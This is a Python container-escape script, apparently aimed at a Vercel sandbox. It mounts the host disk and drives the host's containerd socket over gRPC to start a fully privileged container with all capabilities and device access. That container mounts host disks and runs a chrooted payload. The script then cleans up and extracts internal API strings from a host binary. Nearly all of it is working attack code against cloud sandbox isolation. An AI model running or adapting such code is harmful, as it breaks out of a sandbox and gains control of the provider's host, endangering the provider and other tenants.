# -*- coding: utf-8 -*-
"""vda66: 无 pid namespace 容器 + chroot 执行 v87 payload
通道: COW (/vercel/sandbox) 持久日志
"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v87m.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v87m.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    try:
        open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


PAYLOAD = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vda87_probe_guest.py'), 'rb').read()


def make_spec(cid, with_pid_ns):
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    ns = [{"type": "mount"}, {"type": "uts"}, {"type": "ipc"}]
    if with_pid_ns:
        ns.append({"type": "pid"})
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "echo V66_START $$ > /tmp/v87c.out 2>&1;"
                     "mkdir -p /mnt/g/run /mnt/g/proc /mnt/g/mnt/h;"
                     "timeout 8 mount /dev/vdb /mnt/g 2>&1;"
                     "M_RC=$?;"
                     "echo VDB_RC=$M_RC >> /tmp/v87c.out;"
                     "echo VDB_RC=$M_RC >> /mnt/g/vercel/sandbox/v87c.out 2>&1;"
                     "if [ $M_RC -eq 0 ]; then"
                     " mount --bind /run /mnt/g/run 2>&1; echo BIND_RUN=$? >> /mnt/g/vercel/sandbox/v87c.out;"
                     " mount --bind /proc /mnt/g/proc 2>&1; echo BIND_PROC=$? >> /mnt/g/vercel/sandbox/v87c.out;"
                     " timeout 8 mount /dev/vda /mnt/g/mnt/h 2>&1; echo VDA_RC=$? >> /mnt/g/vercel/sandbox/v87c.out;"
                     " /sbin/chroot /mnt/g /usr/bin/python3 /vercel/sandbox/v87_payload.py "
                     ">> /mnt/g/vercel/sandbox/v87c.out 2>&1;"
                     " echo CHROOT_RC=$? >> /mnt/g/vercel/sandbox/v87c.out;"
                     "fi;"
                     "echo V66_END >> /mnt/g/vercel/sandbox/v87c.out 2>&1;"
                     "sleep 99999"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/",
            "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/sbin", "type": "bind", "source": "/sbin", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]},
            {"destination": "/run", "type": "bind", "source": "/run", "options": ["rbind", "rw"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v87pwn-ctr",
            "namespaces": ns
        }
    }
    return spec


def run_container(CSP, sk, with_pid_ns):
    CID = 'v87a' if with_pid_ns else 'v87b'
    spec = make_spec(CID, with_pid_ns)
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec) + pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=8)
    log('Create %s(%s) %s out=%r' % (CID, 'pid' if with_pid_ns else 'nopid', rc, out[:200]))
    if 'grpc-status: 0' not in rc:
        return False
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, CID)), t=10)
    log('Tasks/Create %s %s out=%r' % (CID, rc, out[:200]))
    if 'grpc-status: 0' not in rc:
        try:
            fp = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s/log.json' % CID
            if os.path.exists(fp):
                log('log.json: %s' % open(fp, 'rb').read(1500).decode(errors='replace')[-800:])
        except Exception:
            pass
        return False
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, CID)), t=10)
    log('Tasks/Start %s %s out=%r' % (CID, rc, out[:150]))
    return True


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount vda ret=%d' % ret)

    global CSP, IMAGE
    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

    pf = '/vercel/sandbox/v87_payload.py'
    try:
        open(pf, 'wb').write(PAYLOAD)
        log('payload written to COW %d bytes' % len(PAYLOAD))
    except Exception as e:
        log('payload write ERR %s' % e)

    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out or b'')
    sk = m.group().decode() if m else None
    log('list %s snap_key=%s' % (rc, sk))

    # 先试无 pid ns (看宿主进程), 失败 fallback 带 pid ns
    ok = run_container(CSP, sk, with_pid_ns=False)
    if not ok:
        log('nopid failed, fallback pid ns')
        run_container(CSP, sk, with_pid_ns=True)

    t_wait = 0
    seen = ''
    done = False
    while t_wait < 60 and not done:
        time.sleep(1)
        t_wait += 1
        try:
            fp = '/vercel/sandbox/v87c.out'
            cur = ''
            if os.path.exists(fp):
                cur = open(fp, errors='replace').read()
            if cur != seen:
                new = cur[len(seen):] if cur.startswith(seen) else cur[-4000:]
                seen = cur
                log('--- COW v87c.out @%ds +%d ---\n%s' % (t_wait, len(new), new[-3000:]))
            if 'V87C_DONE' in cur or 'V66_END' in cur:
                done = True
        except Exception as e:
            log('poll COW EXC %s' % e)

    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d == 'v87a' or d == 'v87b':
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))
    # === celld proto 字段提取 ===
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        log('celld size=%d' % len(data))
        import re as _re
        strs = [s.decode('utf-8', 'replace') for s in _re.findall(rb'[\x20-\x7e]{4,}', data)]
        def dump(title, cond, lim=80):
            seen = set()
            n = 0
            log('--- %s ---' % title)
            for s in strs:
                if cond(s) and s not in seen and len(s) < 200:
                    seen.add(s)
                    log('  %s' % s[:180])
                    n += 1
                    if n >= lim:
                        break
            log('(%d shown)' % n)
        # StreamOutput/Stdin 相关上下文
        dump('STREAM-CTX', lambda s: 'Stream' in s or 'stream' in s or 'Output' in s or 'output' in s)
        dump('STDIN-CTX', lambda s: 'Stdin' in s or 'stdin' in s or 'Input' in s)
        dump('EXEC-CTX', lambda s: ('Exec' in s and len(s) < 120) or 'exec' in s)
        # 容器字段 (驼峰)
        dump('CTR-FIELDS', lambda s: _re.match(r'^[a-z][A-Za-z0-9_]{2,30}$', s) and any(
            k in s for k in ('Id', 'ID', 'Process', 'Container', 'Status', 'Output', 'Input')))
        # proto service/method 全名
        dump('SVC-METHOD', lambda s: bool(_re.match(r'^[A-Za-z0-9_.]+\.[A-Za-z0-9_.]+/[A-Za-z0-9_]+$', s)))
    except Exception as e:
        log('celld analysis EXC %s' % e)
    log('V66M_DONE')
    f.close()


if __name__ == '__main__':
    main()
